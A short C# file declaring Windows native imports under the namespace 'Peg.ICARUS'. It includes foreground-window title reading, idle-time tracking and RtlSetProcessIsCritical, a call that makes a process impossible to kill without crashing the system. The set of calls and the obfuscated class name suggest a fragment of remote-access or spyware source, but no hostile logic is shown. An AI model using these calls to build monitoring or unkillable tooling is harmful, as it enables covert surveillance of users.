using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Peg.ICARUS
{
    public static class Askhshs
    {
        public enum EXECUTION_STATE : uint
        {
            ES_CONTINUOUS = 0x80000000,
            ES_DISPLAY_REQUIRED = 0x00000002,
            ES_SYSTEM_REQUIRED = 0x00000001
        }

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);


        [StructLayout(LayoutKind.Sequential)]
        internal struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)] public uint cbSize;
            [MarshalAs(UnmanagedType.U4)] public uint dwTime;
        }
    }
}